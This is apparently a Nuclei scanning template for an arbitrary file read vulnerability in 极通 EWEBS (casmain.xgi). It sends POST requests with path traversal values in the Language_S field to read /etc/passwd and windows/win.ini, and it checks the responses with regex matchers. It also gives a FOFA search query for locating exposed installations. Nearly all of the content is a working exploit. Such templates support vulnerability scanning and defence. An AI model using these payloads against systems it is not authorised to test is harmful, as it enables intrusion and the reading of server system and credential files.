id: ewebs-casmain-fileread
info:
  name: 极通 EWEBS casmain.xgi - 任意文件读取漏洞
  author: leadlife
  severity: high
  description: 
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="新软科技-极通EWEBS"
  tags: ewebs,fileread,cms


http:
  - raw:
      - |
        POST /casmain.xgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        Language_S=../../../../windows/win.ini
     
      - |
        POST /casmain.xgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        Language_S=../../../../etc/passwd

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200